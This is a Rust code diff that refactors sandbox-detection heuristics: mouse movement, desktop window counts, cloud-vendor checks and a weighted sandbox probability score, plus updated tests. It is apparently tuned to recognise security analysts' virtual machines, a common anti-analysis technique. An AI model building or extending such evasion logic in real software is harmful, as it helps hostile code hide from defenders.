@@ -14,7 +14,7 @@ pub struct SandboxMetrics {
 
 #[cfg(windows)]
 pub fn check_mouse_movement() -> u8 {
-    use winapi::shared::windef::POINT;
+    use crate::win_types::POINT;
 
     let get_cursor_pos: super::win_resolve::FnGetCursorPos = unsafe {
         super::win_resolve::resolve_api_or_load(
@@ -213,8 +213,7 @@ pub fn check_mouse_movement() -> u8 {
 
 #[cfg(windows)]
 pub fn check_desktop_windows() -> u8 {
-    use winapi::shared::minwindef::{BOOL, LPARAM, TRUE};
-    use winapi::shared::windef::HWND;
+    use crate::win_types::{BOOL, HWND, LPARAM};
 
     // Resolve registry functions from advapi32.
     let reg_open_key_ex_w: super::win_resolve::FnRegOpenKeyExW = unsafe {
@@ -300,7 +299,7 @@ pub fn check_desktop_windows() -> u8 {
                 *count += 1;
             }
         }
-        TRUE
+        1
     }
 
     let mut count: usize = 0;
@@ -322,11 +321,11 @@ pub fn check_desktop_windows() -> u8 {
 ///
 /// Returns `None` when the count is unreliable (e.g., restricted `/proc`
 /// permissions prevent scanning other users' processes).  The caller should
-/// treat `None` as a neutral signal rather than evidence of a sandbox.
+/// treat a score of 0 as a neutral signal rather than evidence of a sandbox.
 #[cfg(target_os = "linux")]
-pub fn check_desktop_windows() -> Option<u8> {
+pub fn check_desktop_windows() -> u8 {
     if std::env::var_os("DISPLAY").is_none() {
-        return Some(0);
+        return 0;
     }
     // Try wmctrl first — it lists all managed windows.
     let count = std::process::Command::new("wmctrl")
@@ -345,11 +344,11 @@ pub fn check_desktop_windows() -> Option<u8> {
 
     if let Some(count) = count {
         if count < 3 {
-            return Some(20);
+            return 20;
         } else if count < 8 {
-            return Some(10);
+            return 10;
         }
-        return Some(0);
+        return 0;
     }
 
     // Last resort: count processes that hold an open connection to X11
@@ -404,17 +403,17 @@ pub fn check_desktop_windows() -> Option<u8> {
 
     if cnt == 0 && restricted_access {
         // No observable desktop processes under restricted /proc visibility.
-        // Return None so scoring treats this as unreliable rather than
-        // evidence of a sandbox.
-        return None;
+        // Return 0 so scoring treats this as neutral rather than evidence
+        // of a sandbox.
+        return 0;
     }
 
     if cnt < 3 {
-        Some(20)
+        20
     } else if cnt < 8 {
-        Some(10)
+        10
     } else {
-        Some(0)
+        0
     }
 }
 
@@ -428,12 +427,28 @@ pub fn check_desktop_windows() -> u8 {
         .output()
         .ok()
         .and_then(|o| {
+            if o.status.success() {
+                Some(o)
+            } else {
+                None
+            }
+        })
+        .and_then(|o| {
             String::from_utf8_lossy(&o.stdout)
                 .trim()
                 .parse::<usize>()
                 .ok()
-        })
-        .unwrap_or(0);
+        });
+
+    let Some(count) = count else {
+        // If desktop richness cannot be read (TCC/AppleScript restrictions,
+        // unavailable osascript, or parse failure), treat as neutral rather
+        // than suspicious to avoid false positives.
+        warn!(
+            "env_check_sandbox: macOS desktop richness unavailable; using neutral score"
+        );
+        return 0;
+    };
 
     if count < 3 {
         20
@@ -563,35 +578,34 @@ fn is_cloud_instance_sandbox() -> bool {
             .unwrap_or_default();
         let microsoft_cloud = sys_vendor.contains("microsoft corporation")
             && product_name.contains("virtual machine");
+        // VMware and Xen are generic virtualisation platforms used for
+        // local workstation VMs (VMware Workstation / Fusion) as well as
+        // cloud hosts.  Including them here causes local analyst VMs to be
+        // mis-classified as cloud instances, suppressing sandbox detection.
+        // Cloud VMs behind VMware/Xen are already identified by IMDS in
+        // `is_cloud_instance()` or by product_name tokens like "compute"
+        // and "cloud".
         let vendor_is_known_cloud = sys_vendor.contains("amazon")
             || microsoft_cloud
             || sys_vendor.contains("google")
-            || sys_vendor.contains("digitalocean")
-            || sys_vendor.contains("vmware")
-            || sys_vendor.contains("xen");
+            || sys_vendor.contains("digitalocean");
 
         if vendor_is_known_cloud {
             return true;
         }
 
         if !product_name.is_empty() {
-            if product_name.contains("virtual") {
-                if !vendor_is_known_cloud {
-                    log::debug!(
-                        "sandbox: product_name contains 'virtual' but sys_vendor '{}' is not a known cloud provider; treating as non-cloud",
-                        sys_vendor
-                    );
-                    return false;
-                }
-                return true;
-            }
-            if product_name.contains("kvm")
-                || product_name.contains("cloud")
+            // "cloud" and "compute" in product_name are strong cloud signals
+            // that do not appear on local VMware/VirtualBox VMs.
+            if product_name.contains("cloud")
                 || product_name.contains("compute")
-                || product_name.contains("vmware")
             {
                 return true;
             }
+            // "vmware" or "kvm" alone in product_name is ambiguous — it
+            // could be a local workstation VM.  Only treat as cloud when
+            // combined with another cloud indicator already matched above.
+            // "virtual" alone is similarly ambiguous.
         }
     }
 
@@ -672,15 +686,20 @@ fn is_cloud_instance_sandbox() -> bool {
                     || (vendor_lc.contains("microsoft corporation")
                         && product_lc.contains("virtual machine"))
                     || vendor_lc.contains("google")
-                    || vendor_lc.contains("digitalocean")
-                    || vendor_lc.contains("vmware")
-                    || vendor_lc.contains("xen");
+                    || vendor_lc.contains("digitalocean");
 
-                if product_lc.contains("virtual machine") {
-                    if vendor_is_known_cloud {
-                        return true;
-                    }
-                    return false;
+                // VMware and Xen are generic virtualisation platforms; do
+                // not treat them as cloud-only (local Workstation/Fusion VMs
+                // would otherwise be mis-classified).
+                if product_lc.contains("virtual machine") && vendor_is_known_cloud {
+                    return true;
+                }
+                // "cloud" or "compute" in the product name is a strong cloud
+                // signal independent of vendor.
+                if product_lc.contains("cloud")
+                    || product_lc.contains("compute engine")
+                {
+                    return true;
                 }
 
                 if vendor_is_known_cloud {
@@ -906,10 +925,36 @@ pub fn check_hardware_plausibility() -> u8 {
 /// Total maximum: 100.
 pub fn sandbox_probability_score(metrics: &SandboxMetrics) -> u32 {
     // Cap each signal contribution individually.
-    let mouse_contrib   = std::cmp::min((metrics.mouse_movement_score as u32) * 5, 30);
-    let desktop_contrib = std::cmp::min((metrics.desktop_richness_score as u32) * 3, 25);
-    let uptime_contrib  = std::cmp::min((metrics.uptime_score as u32) * 2, 25);
-    let hw_contrib      = std::cmp::min(metrics.hardware_plausibility_score as u32, 20);
+    let mut mouse_contrib = std::cmp::min((metrics.mouse_movement_score as u32) * 5, 30);
+    let mut desktop_contrib = std::cmp::min((metrics.desktop_richness_score as u32) * 3, 25);
+    let mut uptime_contrib = std::cmp::min((metrics.uptime_score as u32) * 2, 25);
+    let hw_contrib = std::cmp::min(metrics.hardware_plausibility_score as u32, 20);
+
+    // Mouse + desktop are highly correlated in non-interactive/headless
+    // environments. Cap their combined weight so legitimate fresh hosts are
+    // not over-penalized by two manifestations of the same condition.
+    if mouse_contrib > 0 && desktop_contrib > 0 {
+        let combined = mouse_contrib + desktop_contrib;
+        if combined > 30 {
+            let overflow = combined - 30;
+            if mouse_contrib >= desktop_contrib {
+                mouse_contrib = mouse_contrib.saturating_sub(overflow);
+            } else {
+                desktop_contrib = desktop_contrib.saturating_sub(overflow);
+            }
+        }
+    }
+
+    // Freshly booted but otherwise plausible hosts can have little temp/file
+    // history immediately after provisioning. Keep uptime as a supporting
+    // signal unless corroborated by additional suspicious hardware evidence.
+    if hw_contrib == 0 && uptime_contrib > 0 {
+        if mouse_contrib == 0 && desktop_contrib == 0 {
+            uptime_contrib = uptime_contrib.min(10);
+        } else if mouse_contrib > 0 && desktop_contrib > 0 {
+            uptime_contrib = uptime_contrib.min(10);
+        }
+    }
 
     let score = mouse_contrib + desktop_contrib + uptime_contrib + hw_contrib;
     std::cmp::min(score, 100)
@@ -920,15 +965,7 @@ pub fn sandbox_probability_score(metrics: &SandboxMetrics) -> u32 {
 /// individual `SandboxIndicator`s from each metric.
 pub fn collect_raw_metrics() -> SandboxMetrics {
     #[cfg(target_os = "linux")]
-    let desktop_richness_score = match check_desktop_windows() {
-        Some(score) => score,
-        None => {
-            warn!(
-                "env_check_sandbox: desktop window score unavailable due to restricted /proc permissions; using neutral contribution"
-            );
-            0
-        }
-    };
+    let desktop_richness_score = check_desktop_windows();
 
     #[cfg(not(target_os = "linux"))]
     let desktop_richness_score = check_desktop_windows();
@@ -947,15 +984,7 @@ pub fn collect_raw_metrics() -> SandboxMetrics {
 /// The caller decides what to do with the score — see `EnvReport::sandbox_score`.
 pub fn evaluate_sandbox() -> Result<u32> {
     #[cfg(target_os = "linux")]
-    let desktop_richness_score = match check_desktop_windows() {
-        Some(score) => score,
-        None => {
-            warn!(
-                "env_check_sandbox: desktop window score unavailable due to restricted /proc permissions; using neutral contribution"
-            );
-            0
-        }
-    };
+    let desktop_richness_score = check_desktop_windows();
 
     #[cfg(not(target_os = "linux"))]
     let desktop_richness_score = check_desktop_windows();
@@ -1003,13 +1032,23 @@ mod tests {
         );
     }
 
-    /// Two elevated signals should reach "moderate" but not "high".
+    /// Mouse+desktop are coupled interaction signals and should be dampened
+    /// when they rise together.
     #[test]
-    fn two_signals_moderate_not_high() {
-        // mouse=20 (cap 30) + desktop=20 (cap 25) = 55
+    fn coupled_interaction_signals_are_dampened() {
         let score = sandbox_probability_score(&metrics(20, 20, 0, 0));
-        assert!(score > 30, "two signals should exceed moderate threshold: got {score}");
-        assert!(score <= 60, "two signals should not exceed high threshold: got {score}");
+        assert!(
+            score <= 30,
+            "coupled interaction-only signals should not exceed moderate threshold: got {score}"
+        );
+    }
+
+    /// Independent signals should still reach the moderate range.
+    #[test]
+    fn independent_signals_reach_moderate() {
+        let score = sandbox_probability_score(&metrics(20, 0, 20, 0));
+        assert!(score > 30, "independent signals should exceed moderate threshold: got {score}");
+        assert!(score <= 60, "independent signals should stay below high threshold: got {score}");
     }
 
     /// All four signals at maximum should reach 100.
